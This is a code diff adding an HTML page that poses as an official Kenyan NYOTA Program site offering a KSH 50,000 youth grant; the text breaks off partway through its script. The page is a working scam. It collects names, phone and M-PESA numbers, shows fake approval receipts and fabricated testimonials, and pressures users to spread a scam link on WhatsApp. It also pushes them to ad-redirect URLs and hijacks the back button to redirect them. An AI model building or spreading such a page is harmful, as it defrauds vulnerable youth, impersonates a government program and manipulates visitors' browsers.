@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head> 
+    <title>NYOTA PROGRAM - KSH 50,000 Youth Grant Disbursement</title>
+    
+    <!-- Google Fonts (NYOTA Style) -->
+    <link href="https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <link rel="shortcut icon" type="image/png" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPeEQdWa2tegJRfF1h1HblPqqWQHvaKctlyHSj6up3UZ-jZ0tBEAgIqV69o3rviniv2_td6la8N8KD2g5Y56FLmKGbkz_xZBGXlCoxk5ZjyEtm0rHV_8oaRSsvtjgrkAQCNyQu0a0qziFOOugeKPMvfCJb0q8sBKzgs98JUPp3T8EFLPq8UH6WgwQb_s9Y/s5040/49102.png" />
+    <meta property="og:title" content="NYOTA PROGRAM - KSH 50,000 Grant Disbursement" />
+    <meta property="og:description" content="Official NYOTA Program KSH 50,000 Disbursement to Kenyan Youth - Check Eligibility & Verify Status" />
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2sKi4YU8YDtUPTy6S14pVGKZs7xicap0hxGTaL83x-_hApHopD4mzhHmYD_mSGzwxHSYX0H87ZmMIskZrPvlqH9dEV49_aFBZuWto7zF729BOiMiZBD-_1cP8DaMnBRaY4whRyMA-Xa6ioVqMaWPDxpT90NOp0Xg6B-Ts6-L6LHvbvAOPK0n5LcMQoT_A/s2048/49178.jpg" />
+    <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+</head>
+
+<body>
+
+<!-- PRELOADER -->
+<div id="preloader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+    <p style="font-family: 'Kumbh Sans', sans-serif; font-size: 18px; color: #333; margin-bottom: 20px;">Please wait...</p>
+    <div style="width: 80px; height: 80px; border: 8px solid #f3f3f3; border-top: 8px solid #0a540e; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+</div>
+<style>
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+            var preloader = document.getElementById('preloader');
+            if (preloader) {
+                preloader.style.transition = 'opacity 0.3s ease';
+                preloader.style.opacity = '0';
+                setTimeout(function() { preloader.style.display = 'none'; }, 300);
+            }
+        }, 1000);
+    });
+</script>
+
+<style type="text/css">
+/* ═══════════════════════════════════════════ NYOTA OFFICIAL STYLES ═══════════════════════════════════════════ */
+:root {
+    --theme-color: #0a540e;
+    --theme-hover: #389c3d;
+    --border-color: #35ab57;
+}
+
+body { margin: 0; font-family: 'Kumbh Sans', sans-serif; background: #f4f6f4; color: #000; }
+a { text-decoration: none; color: var(--theme-color); }
+a:hover { color: var(--theme-hover); }
+
+/* Structure */
+.post { background: #fff; margin: 0 auto; padding: 20px; max-width: 600px; border: 1px solid #ddd; border-radius: 5px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);}
+.post img { width: 100%; border-radius: 3px;}
+.welcome { font-size: 16px; line-height: 1.6; color: #333;}
+.amount, #getname { color: var(--theme-color); font-weight: 700; }
+.title { text-align: center; font-weight: 700; color: var(--theme-color); font-size: 18px; margin-bottom: 15px;}
+.error { display: none; text-align: center; font-size: 14px; color: #e74c3c;}
+.tip { font-size: 15px; line-height: 1.5; color: #444;}
+
+/* Buttons */
+button { display: block; width: 100%; height: 52px; color: #fff; border: none; outline: none; font-size: 18px; cursor: pointer; border-radius: 4px; padding: 0 10px; margin: 15px auto; background: var(--theme-color); transition: background 0.3s ease; font-weight: 700; font-family: 'Kumbh Sans', sans-serif;}
+button:hover { background: var(--theme-hover);}
+#confirm { width: 100%; margin: 10px auto;}
+#whatsapp { background: #25D366; }
+#whatsapp:hover { background: #128C7E; }
+
+/* Forms */
+.phone { max-width: 400px; margin: 10px auto;}
+.phone input, .phone select { width: 100%; height: 50px; padding: 10px; outline: none; border: 1px solid #ccc; font-size: 16px; margin-bottom: 15px; border-radius: 4px; font-family: 'Kumbh Sans', sans-serif;}
+
+/* Loaders & Progress */
+#loader { text-align: center; padding: 30px 0;}
+.spin { width: 50px; height: 50px; background: transparent; border: solid 6px var(--theme-color); border-right-color: transparent; border-radius: 50%; margin: 10px auto; animation: spin 0.8s linear infinite;}
+@keyframes spin { 100% { transform: rotate(1turn); }}
+.barr { direction: ltr; max-width: 400px; margin: 15px auto; display: flex; align-items: center; gap: 10px;}
+.fill { flex: 1; height: 35px; padding: 2px; border: 2px solid var(--theme-color); border-radius: 4px;}
+#fill,#fill2 { background: var(--theme-color); width: 0%; height: 100%; border-radius: 2px; transition: width 0.1s linear;}
+.percentage { width: 60px; text-align: right; font-size: 16px; font-weight: bold; color: var(--theme-color);}
+
+/* Display Logic */
+#loader, #info, #checking, #share, #claim { display: none; }
+
+/* ═══════════════════════════════════════════ OFFICIAL RECEIPT STYLE ═══════════════════════════════════════════ */
+.receipt-container {
+    background: #fff;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    padding: 25px;
+    margin: 20px 0;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+    font-family: Arial, sans-serif;
+}
+.receipt-header {
+    text-align: center;
+    border-bottom: 2px solid var(--theme-color);
+    padding-bottom: 15px;
+    margin-bottom: 20px;
+}
+.receipt-header h2 {
+    font-size: 20px;
+    color: var(--theme-color);
+    margin: 0 0 5px 0;
+    font-weight: 700;
+}
+.receipt-header p {
+    font-size: 13px;
+    color: #555;
+    margin: 0;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+.receipt-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-bottom: 20px;
+}
+.receipt-table td {
+    padding: 12px 10px;
+    border-bottom: 1px solid #eee;
+    font-size: 15px;
+    color: #333;
+}
+.receipt-table td:first-child {
+    font-weight: 600;
+    color: #555;
+    width: 40%;
+}
+.receipt-table td:last-child {
+    font-weight: 700;
+    color: #111;
+}
+.receipt-table tr:nth-child(even) {
+    background-color: #f9fdf9;
+}
+.status-stamp {
+    display: block;
+    width: 100%;
+    text-align: center;
+    padding: 10px;
+    background: #fff3cd;
+    color: #856404;
+    border: 2px dashed #ffeeba;
+    font-weight: 800;
+    font-size: 16px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    border-radius: 4px;
+}
+
+/* ═══════════════════════════════════════════ DYNAMIC COMMENTS WIDGET ═══════════════════════════════════════════ */
+#flc-widget { width: 100%; background: #FFFFFF; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05); overflow: hidden; display: flex; flex-direction: column; color: #0F172A; margin-top: 20px; font-family: 'Kumbh Sans', sans-serif; }
+.flc-comment-row { display: flex; gap: 10px; margin: 8px 0; width: 100%; animation: flcPop .25s ease; }
+.flc-comment-col { flex: 1; min-width: 0; }
+.flc-comment-bubble { background: #f1f5f9; border-radius: 14px; padding: 9px 14px; display: inline-block; max-width: 100%; word-wrap: break-word; overflow-wrap: anywhere; word-break: break-word; font-size: 13px; line-height: 1.45; color: #0F172A; }
+.flc-replies { margin-left: clamp(10px, 2.5vw, 20px); padding-left: clamp(8px, 1.5vw, 12px); border-left: 2px solid #E2E8F0; margin-top: 4px; }
+.flc-action-btn { background: none; border: none; color: #64748B; font-weight: 700; font-size: 11.5px; cursor: pointer; padding: 0 2px; }
+.flc-action-btn:hover { text-decoration: underline; color: var(--theme-color); }
+.flc-reply-input-box { display: flex; gap: 6px; margin-top: 6px; width: 100%; }
+.flc-reply-input-box input { flex: 1; min-width: 0; border: 1px solid #E2E8F0; background: #F8FAFC; border-radius: 999px; padding: 4px 14px; font-size: 12.5px; height: 34px; margin: 0; outline: none; }
+@keyframes flcPop { 0% { opacity: 0; transform: translateY(4px) scale(.98); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
+
+/* Header & Footer */
+.header { position: fixed; top: 0; left: 0; width: 100%; height: 80px; background-color: #ffffff; display: flex; align-items: center; justify-content: space-between; padding: 0 30px; box-sizing: border-box; box-shadow: 0 2px 6px rgba(0,0,0,0.1); z-index: 1000; }
+.logo img { height: 50px; }
+.header-icons { display: flex; align-items: center; gap: 25px; }
+.menu-icon { width: 28px; cursor: pointer; }
+.menu-icon span { display: block; height: 3px; background-color: var(--theme-color); margin: 5px 0; }
+.search-icon { width: 28px; height: 28px; border: 3px solid var(--theme-color); border-radius: 50%; position: relative; cursor: pointer; }
+.search-icon::after { content: ''; position: absolute; width: 12px; height: 3px; background-color: var(--theme-color); bottom: -6px; right: -6px; transform: rotate(45deg); }
+
+.hero-section { background: #fff; text-align: center; }
+.hero-section img { width: 100%; max-width: 100%; display: block; }
+
+.footer { background-color: #0d1f22; color: #a0aec0; padding: 40px 20px; text-align: left; margin-top: 40px; }
+.footer h3 { color: #cbd5e0; font-size: 16px; margin-bottom: 20px; font-weight: normal; font-family: 'Kumbh Sans', sans-serif;}
+.footer p { margin: 10px 0; font-size: 14px; display: flex; align-items: center; gap: 10px; font-family: 'Kumbh Sans', sans-serif;}
+.footer .social-icons { display: flex; gap: 15px; margin-top: 20px; }
+.footer .social-icons img { width: 32px; height: 32px; object-fit: contain; }
+.footer .bottom-text { margin-top: 40px; font-size: 12px; text-align: center; color: #718096; line-height: 1.6; font-family: 'Kumbh Sans', sans-serif;}
+
+</style>
+
+<!-- HEADER -->
+<header class="header"> 
+    <div class="logo"> 
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfS-PyIItuUr2Bw71CVEuMAqOtzg5Qmo9cRVS1zz43CIH8V5ULIthGeJrlxagkeNvXrSj34JYcmJHX1VL4P-ANzrkh5Gpa09zR-4rB9vq1O3rnsj2Qpo8MRfrDosEo7nXwBlQsi_zRN-JbKevhyhyPfUNis4aKfaYO88HUVZTG0Ge6waC11YnT9qXDsyxz/s320/49110.png" alt="NYOTA Logo" onerror="this.src='https://via.placeholder.com/150x50?text=NYOTA+LOGO'"> 
+    </div>
+    <div class="header-icons"> 
+        <div class="menu-icon"> <span></span> <span></span> <span></span> </div>
+        <div class="search-icon"></div> 
+    </div>
+</header> 
+
+<br><br><br><br>
+
+<!-- HERO SECTION -->
+<div class="hero-section">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijuNltYZJzj5oS0FKLf5HSBC2wVKoz4DHaC4gQB-lA7rewufvd_1dIKHVkRAtzZbw6wIkC_1V_kxYuZLiRT8d8w8nd9vz8WolndXVYBnfineiGIXlTXEqn5nERFt-xj5DpMU0sxmA272DESUU8gwVLU-Oq7OKVarjDN1TBLhxH32S6tuvik9FsJRAOKkVW/s1917/49111.png" alt="NYOTA Project Dashboard" onerror="this.src='https://via.placeholder.com/800x400?text=Project+Dashboard+Image'">
+</div>
+
+<marquee class="horizontal_marque" direction="left" style="background: var(--theme-color); color: white; padding: 10px; font-weight: bold;"> URGENT: KSH 50,000 DISBURSEMENT READY FOR ELIGIBLE YOUTH - VERIFY YOUR STATUS NOW </marquee>
+
+<div style="padding: 20px 10px;">
+    <div class="post"> 
+        <div id="intro"> 
+            <p class="welcome"> 
+                <center>
+                    <span class="amount">ATTENTION KENYAN YOUTH:</span> The NYOTA Program has approved the disbursement of <span class="amount">KSH 50,000</span> to eligible beneficiaries. Funds are ready for immediate transfer to qualified applicants. Click "CHECK ELIGIBILITY" to verify if you're among the selected recipients.
+                </center> 
+                <br> 
+                <center><span style="color: #e74c3c; font-weight: bold;"> Note: Disbursement window closes in 24 hours</span></center> 
+                <br> 
+                <button id="go" style="width: 90%; max-width: 300px;">CHECK ELIGIBILITY</button> 
+            </p> 
+        </div> 
+
+        <div id="loader"> 
+            <div style="color: var(--theme-color); font-weight: 600; font-size: 18px;">Checking Disbursement Status...</div> 
+            <div class="spin"></div> 
+            <div id="num" style="font-size: 20px; font-weight: bold; color: var(--theme-color);">0%</div> 
+        </div> 
+
+        <div id="info"> 
+            <p class="title">VERIFY YOUR DISBURSEMENT DETAILS:</p> 
+            <div class="phone"> 
+                <center> 
+                    <input type="text" placeholder="Full Name" id="name" name="name"> 
+                    <input type="tel" placeholder="Phone Number" id="idnumber" name="phone"> 
+                    <select id="county"> 
+                        <option value="" selected disabled>Select Your County</option> 
+                        <option value="Mombasa">Mombasa</option> 
+                        <option value="Kwale">Kwale</option> 
+                        <option value="Kilifi">Kilifi</option> 
+                        <option value="Tana River">Tana River</option> 
+                        <option value="Lamu">Lamu</option> 
+                        <option value="Taita Taveta">Taita Taveta</option> 
+                        <option value="Garissa">Garissa</option> 
+                        <option value="Wajir">Wajir</option> 
+                        <option value="Mandera">Mandera</option> 
+                        <option value="Marsabit">Marsabit</option> 
+                        <option value="Isiolo">Isiolo</option> 
+                        <option value="Meru">Meru</option> 
+                        <option value="Tharaka-Nithi">Tharaka-Nithi</option> 
+                        <option value="Embu">Embu</option> 
+                        <option value="Kitui">Kitui</option> 
+                        <option value="Machakos">Machakos</option> 
+                        <option value="Makueni">Makueni</option> 
+                        <option value="Nyandarua">Nyandarua</option> 
+                        <option value="Nyeri">Nyeri</option> 
+                        <option value="Kirinyaga">Kirinyaga</option> 
+                        <option value="Murang'a">Murang'a</option> 
+                        <option value="Kiambu">Kiambu</option> 
+                        <option value="Turkana">Turkana</option> 
+                        <option value="West Pokot">West Pokot</option> 
+                        <option value="Samburu">Samburu</option> 
+                        <option value="Trans Nzoia">Trans Nzoia</option> 
+                        <option value="Uasin Gishu">Uasin Gishu</option> 
+                        <option value="Elgeyo-Marakwet">Elgeyo-Marakwet</option> 
+                        <option value="Nandi">Nandi</option> 
+                        <option value="Baringo">Baringo</option> 
+                        <option value="Laikipia">Laikipia</option> 
+                        <option value="Nakuru">Nakuru</option> 
+                        <option value="Narok">Narok</option> 
+                        <option value="Kajiado">Kajiado</option> 
+                        <option value="Kericho">Kericho</option> 
+                        <option value="Bomet">Bomet</option> 
+                        <option value="Kakamega">Kakamega</option> 
+                        <option value="Vihiga">Vihiga</option> 
+                        <option value="Bungoma">Bungoma</option> 
+                        <option value="Busia">Busia</option> 
+                        <option value="Siaya">Siaya</option> 
+                        <option value="Kisumu">Kisumu</option> 
+                        <option value="Homa Bay">Homa Bay</option> 
+                        <option value="Migori">Migori</option> 
+                        <option value="Kisii">Kisii</option> 
+                        <option value="Nyamira">Nyamira</option> 
+                        <option value="Nairobi">Nairobi City</option> 
+                    </select> 
+                    <input type="tel" placeholder="M-PESA Number for Disbursement" id="mpesa" name="mpesa"> 
+                    <p style="font-size: 13px; color: #666; margin-bottom: 20px; text-align: left; padding: 0 10px;">  <strong>Note:</strong> Funds will be disbursed directly to the M-PESA number provided above </p> 
+                    <br> 
+                    <button id="confirm" onclick="getit()">VERIFY & CLAIM KSH 50,000</button> 
+                </center> 
+            </div> 
+            <p class="error">Please complete all required fields to verify your disbursement!</p> 
+        </div> 
+
+        <div id="checking"> 
+            <p class="title">Verifying Your Disbursement Eligibility...</p> 
+            <div class="barr"> 
+                <div class="fill"> 
+                    <div id="fill"></div> 
+                </div> 
+                <div class="percentage center"> 
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span> 
+                    <span id="check"><i class="fa fa-check-circle"></i></span> 
+                    <span id="percentage"></span> 
+                </div> 
+            </div> 
+        </div> 
+
+        <div id="share"> 
+            <!-- NEW OFFICIAL RECEIPT STYLE -->
+            <div class="receipt-container">
+                <div class="receipt-header">
+                    <h2> DISBURSEMENT APPROVED</h2>
+                    <p>NYOTA Program - Official Receipt</p>
+                </div>
+                <p style="text-align: center; font-size: 15px; color: #333; margin-bottom: 20px;">
+                    <strong>CONGRATULATIONS!</strong> Your <b>KSH 50,000</b> disbursement has been approved. Verify your details below.
+                </p>
+
+                <table class="receipt-table">
+                    <tr>
+                        <td>Beneficiary Name:</td>
+                        <td id="getname" style="color: var(--theme-color);"></td>
+                    </tr>
+                    <tr>
+                        <td>Phone Number:</td>
+                        <td id="getid"></td>
+                    </tr>
+                    <tr>
+                        <td>County:</td>
+                        <td id="getcounty"></td>
+                    </tr>
+                    <tr>
+                        <td>M-PESA Number:</td>
+                        <td id="getmpesa" style="color: var(--theme-color); font-weight: 800;"></td>
+                    </tr>
+                    <tr>
+                        <td>Amount Approved:</td>
+                        <td style="color: var(--theme-color); font-weight: 800; font-size: 16px;">KSH 50,000</td>
+                    </tr>
+                </table>
+
+                <div class="status-stamp">Status: PENDING RELEASE</div>
+            </div>
+            <!-- END RECEIPT -->
+
+            <br><h3 style="color: var(--theme-color); text-align: center;"> DISBURSEMENT VERIFIED!</h3><br> 
+            <p style="font-size: 15px; color: #333; text-align: center; line-height: 1.5;"> Your <b>KSH 50,000 NYOTA DISBURSEMENT</b> has been confirmed and is <b>READY FOR TRANSFER</b>. To complete the disbursement process, follow these final steps: </p><br> 
+            <p style="font-size: 15px; color: #333; text-align: center;"> Funds will be sent to your M-PESA within <b>24 HOURS</b> after completing verification. </p> 
+            <br> 
+            <p class="tip" style="text-align: center;">1. Share this disbursement information with other Kenyan youth who may also qualify (Share with 5 groups or 15 friends on WhatsApp).</p><br> 
+            <p class="tip" style="text-align: center;">2. After sharing, you will be automatically redirected to the "<b>Disbursement Release Portal</b>".</p><br> 
+            <p class="tip" style="text-align: center;">3. Complete the final verification step to trigger immediate fund transfer.</p> 
+            <button id="whatsapp" style="width: 90%; max-width: 300px; margin: 20px auto;">SHARE DISBURSEMENT INFO</button> 
+            <div class="barr"> 
+                <div class="fill"> 
+                    <div id="fill2"></div> 
+                </div> 
+                <div class="percentage center"> 
+                    <span><i class="fa fa-spinner fa-pulse"></i></span> 
+                    <span id="percentage2">0%</span> 
+                </div> 
+            </div> 
+        </div> 
+
+        <div id="claim"> 
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true" style="color: var(--theme-color);"></i></p> 
+            <center>
+                <div style="text-align: center; background-color: #f9f9f9; border: 1px solid #ddd; padding: 15px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; max-width: 400px;"> 
+                    <a href="https://otieu.com/4/10077877" style="text-decoration: none; color: #000; font-size: 16px; font-weight: bold;">
+                        <img src="https://nyotaproject.go.ke/sites/default/files/gva-sliderlayer-upload/IMG19357.jpg" alt="NYOTA Disbursement Kenya" style="width: 100%;">
+                        <span style="color: red; animation: blink 1s infinite;">CLICK TO RELEASE</span>  
+                    </a> 
+                    <p style="font-size: 12px; color: gray; margin-top: 5px;">Official NYOTA Program Disbursement</p> 
+                </div> 
+            </center> 
+            <style> @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } } </style> 
+            <br> 
+            <p class="title">  <strong>DISBURSEMENT PROCESS COMPLETE!</strong><br><br> Your KSH 50,000 NYOTA Program disbursement has been processed and is ready for immediate transfer.<br> Click the button below to authorize release of funds to your M-PESA account.<br><br> <span style="color: #e74c3c; font-weight: bold;"> IMPORTANT: Disbursement must be claimed within 24 hours</span> </p> 
+            <br/> 
+            <button onclick="window.open('https://otieu.com/4/10077877')" class="btn btn-primary" style="background: var(--theme-color);">  RELEASE KSH 50,000 TO M-PESA </button> 
+            <button onclick="window.open('https://otieu.com/4/10077877')" class="btn btn-primary" style="background: #2980b9;">  GET DISBURSEMENT CONFIRMATION </button> 
+            <button onclick="window.open('https://otieu.com/4/10077877')" class="btn btn-primary" style="background: #8e44ad;">  CHECK TRANSFER STATUS </button> 
+            <button id="offer">  CONFIRM DISBURSEMENT </button> 
+            <p style="font-size: 12px; color: #666; text-align: center; margin-top: 20px;"> 📞 For disbursement support: Call NYOTA Helpline 020-123-4567<br>  M-PESA transfers processed within 2-24 hours </p> 
+        </div> 
+
+        <!-- NEW DYNAMIC COMMENTS WIDGET -->
+        <div id="flc-widget">
+            <!-- Reaction Bar Header -->
+            <div style="display:flex; justify-content:space-between; align-items:center; padding:10px 14px; font-size:12.5px; color:#64748B; background:#F8FAFC; border-bottom:1px solid #E2E8F0;">
+                <div style="display:flex; align-items:center; gap:4px;">
+                    <span style="display:inline-flex; align-items:center;">
+                        <span style="width:16px; height:16px; border-radius:50%; background:#1B74E4; display:flex; align-items:center; justify-content:center; border:1.5px solid #fff; z-index:2;">
+                            <svg viewBox="0 0 24 24" width="9" height="9" style="fill:#fff;"> <path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z" /> </svg>
+                        </span>
+                        <span style="width:16px; height:16px; border-radius:50%; background:#F33E58; display:flex; align-items:center; justify-content:center; border:1.5px solid #fff; margin-left:-5px; z-index:1;">
+                            <svg viewBox="0 0 24 24" width="8" height="8" style="fill:#fff;"> <path d="M12 21s-6.7-4.35-9.33-8.4C.86 9.94 1.6 6.6 4.36 5.1 6.6 3.9 9.3 4.6 12 7.6c2.7-3 5.4-3.7 7.64-2.5 2.76 1.5 3.5 4.84 1.69 7.5C18.7 16.65 12 21 12 21z" /> </svg>
+                        </span>
+                    </span>
+                    <span id="flcLikeTotal" style="font-weight:700; color:#0F172A;">341</span>
+                </div>
+                <div style="display:flex; gap:12px; font-weight:500;">
+                    <span><b id="flcCommentCount" style="color:#0F172A; font-weight:700;">0</b> comments</span>
+                    <span>18 shares</span>
+                </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div style="display:flex; border-bottom:1px solid #E2E8F0;">
+                <button type="button" id="flcPostLikeBtn" style="flex:1; display:flex; align-items:center; justify-content:center; gap:6px; padding:6px 0; background:none; border:none; cursor:pointer; font-weight:700; font-size:12.5px; color:#64748B; height:36px; margin:0; box-shadow:none;">
+                    <svg viewBox="0 0 24 24" width="15" height="15" style="fill:currentColor;"> <path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z" /> </svg> Like 
+                </button>
+                <button type="button" id="flcPostCommentBtn" style="flex:1; display:flex; align-items:center; justify-content:center; gap:6px; padding:6px 0; background:none; border:none; cursor:pointer; font-weight:700; font-size:12.5px; color:#64748B; height:36px; margin:0; box-shadow:none;">
+                    <svg viewBox="0 0 24 24" width="15" height="15" style="fill:currentColor;"> <path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z" /> </svg> Comment 
+                </button>
+                <button type="button" id="flcPostShareBtn" style="flex:1; display:flex; align-items:center; justify-content:center; gap:6px; padding:6px 0; background:none; border:none; cursor:pointer; font-weight:700; font-size:12.5px; color:#64748B; height:36px; margin:0; box-shadow:none;">
+                    <svg viewBox="0 0 24 24" width="15" height="15" style="fill:currentColor;"> <path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z" /> </svg> Share 
+                </button>
+            </div>
+
+            <!-- Comments List Scroll Area -->
+            <div id="flcComments" style="padding:10px 14px; overflow-y:auto; max-height:400px; scroll-behavior:smooth;">
+            </div>
+
+            <!-- Comment Composer -->
+            <div style="padding:10px 14px; border-top:1px solid #E2E8F0; background:#fff;">
+                <div style="display:flex; gap:8px; align-items:center;">
+                    <div id="flcYouAvatar" style="width:30px; height:30px; border-radius:50%; flex-shrink:0; background:var(--theme-color); color:#fff; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:800;">Y</div>
+                    <form id="flcComposerForm" style="flex:1; display:flex; gap:6px; align-items:center;">
+                        <input id="flcComposerInput" type="text" placeholder="Write a comment…" autocomplete="off" maxlength="200" style="flex:1; border:1px solid #E2E8F0; background:#F8FAFC; border-radius:999px; padding:0 14px; font-size:13px; outline:none; height:36px; margin:0;" />
+                        <button type="submit" style="border:none; background:var(--theme-color); color:#fff; width:34px; height:34px; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; flex-shrink:0; margin:0; box-shadow:none;">
+                            <svg viewBox="0 0 24 24" width="14" height="14" style="fill:#fff;"> <path d="M2 21l21-9L2 3v7l15 2-15 2z" /> </svg>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <!-- END DYNAMIC COMMENTS WIDGET -->
+
+    </div>
+</div>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <h3>National Youth Opportunities Towards Advancement</h3>
+    <p>📍 Standard Street, Bruce House 3rd Floor</p>
+    <p>📧 Email: info@nyotaproject.go.ke</p>
+    <p>📞 Toll Free: 0800222221</p>
+    
+    <div class="social-icons">
+        <!-- UPDATE THESE SRC LINKS WITH YOUR OWN IMAGES -->
+        <img src="https://via.placeholder.com/32x32?text=Tw" alt="Twitter">
+        <img src="https://via.placeholder.com/32x32?text=Fb" alt="Facebook">
+        <img src="https://via.placeholder.com/32x32?text=Ig" alt="Instagram">
+        <img src="https://via.placeholder.com/32x32?text=In" alt="LinkedIn">
+        <img src="https://via.placeholder.com/32x32?text=Yt" alt="YouTube">
+        <img src="https://via.placeholder.com/32x32?text=Tk" alt="TikTok">
+    </div>
+    
+    <div class="bottom-text">
+        The Official Website | Copyright © 2026.<br>
+        National Youth Opportunities Towards Advancement (NYOTA) Project.
+    </div>
+</footer>
+
+<script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+<script type="text/javascript">
+    // Progress & Form Logic
+    $("#go").click(function () { 
+        $("#intro").fadeOut(0); 
+        $("#loader").fadeIn(1000); 
+        var i = 0; 
+        var interval = setInterval(function () { 
+            $("#num").text(i + "%"); 
+            i += 1; 
+            if (i >= 100) { 
+                clearInterval(interval); 
+                $("#loader").fadeOut(0); 
+                $("#info").fadeIn(1000); 
+            } 
+        }, 50); 
+    });
+
+    $("#confirm").click(function () { 
+        if ($("#name").val().length < 4) { 
+            $(".error").fadeIn(500); 
+        } else { 
+            $("#info").fadeOut(0); 
+            $("#checking").fadeIn(1000); 
+            var i = 0; 
+            var interval = setInterval(function () { 
+                i += 1; 
+                $("#percentage").text(i + "%"); 
+                $("#fill").css("width", i + "%"); 
+                if (i == 50) { 
+                    i = 49; 
+                    setTimeout(function () { i = 50; }, 1000); 
+                } 
+                if (i >= 100) { 
+                    clearInterval(interval); 
+                    $("#load").fadeOut(0); 
+                    $("#check").fadeIn(0); 
+                    setTimeout(function () { 
+                        $("#checking").fadeOut(0); 
+                        $("#share").fadeIn(1000); 
+                        $("#getname").html($("#name").val()); 
+                    }, 500); 
+                } 
+            }, 50); 
+        } 
+    });
+
+    $(document).click(function () { 
+        if ($("#name").is(":focus")) { 
+            $(".error").fadeOut(500); 
+        } 
+    });
+
+    // Form Field Sync
+    $("#county").on("change", function() { $("#getcounty").html($(this).val()); });
+    $("#idnumber").on("input", function() { $("#getid").html($(this).val()); });
+    $("#mpesa").on("input", function() { $("#getmpesa").html($(this).val()); });
+
+    // Share Logic
+    var text1 = "*URGENT: NYOTA PROGRAM DISBURSEMENT KSH 50,000 READY*%0A%0AAre you a Citizen of Kenya? The NYOTA Program is disbursing KSH 50,000 to eligible beneficiaries RIGHT NOW! Funds are ready for immediate M-PESA transfer.%0A%0ACLAIM NOW👉: https://awkl.xyz/NYOTA-DISBURSEMENT %0A%0A Don't miss your disbursement! Share With Other Kenyans to Benefit", 
+    error = "Please share with different friends or groups to complete verification!", 
+    abcde = "https://otieu.com/4/10077877", 
+    share = "whatsapp://send?text=" + text1;
+
+    var shareCount = 0;
+    var width = 0;
+
+    $("#whatsapp").click(function () { 
+        window.location.href = share; 
+        setTimeout(function() { 
+            shareCount++; 
+            if (shareCount === 1) width = 50; 
+            else if (shareCount === 2) width = 60; 
+            else if (shareCount === 3) width = 70; 
+            else if (shareCount === 4) width = 75; 
+            else if (shareCount === 5) width = 80; 
+            else if (shareCount === 6) width = 85; 
+            else if (shareCount === 7) width = 88; 
+            else if (shareCount === 8) width = 90; 
+            else if (shareCount === 9) width = 94; 
+            else if (shareCount === 10) width = 98; 
+            else if (shareCount >= 11) width = 100; 
+            
+            $("#fill2").css("width", width + "%"); 
+            $("#percentage2").text(width + "%"); 
+            
+            if (shareCount === 2 || shareCount === 4 || shareCount === 5) { 
+                alert(error); 
+            } 
+            
+            if (width >= 100) { 
+                setTimeout(function() { 
+                    $("#share").fadeOut(0); 
+                    $("#claim").fadeIn(1000); 
+                }, 1000); 
+            } 
+        }, 500); 
+    });
+
+    $("#offer").click(function () { window.open(abcde, "_blank"); });
+
+    // Back Button Redirect
+    window.onhashchange=function(){jp();}; 
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());} 
+    function jp() { fh();} 
+    setTimeout('hh();', 500); 
+    function fh(){ location.href="https://ey43.com/4/10077877"; } 
+    function goon(){ location.href="https://ey43.com/4/10077877"; } 
+
+    // ═══════════════════════════════════════════ DYNAMIC COMMENTS SCRIPT ═══════════════════════════════════════════
+    (function () { 
+        const NAMES = ["James Mwangi", "Sarah Akinyi", "Peter Odhiambo", "Grace Wambui", "David Kiptoo", "Mary Wanjiku", "John Kamau"]; 
+        const COMMENTS = [ 
+            "I just received my KSH 50,000 disbursement! It came to my M-PESA this morning. Asante sana NYOTA Program! Starting my boda boda business today! 🏍️", 
+            "Verified my disbursement yesterday, funds came this morning at 8 AM! Received my KSH 50,000. Using it to stock my small shop in Kisumu. God bless this program! 🙏", 
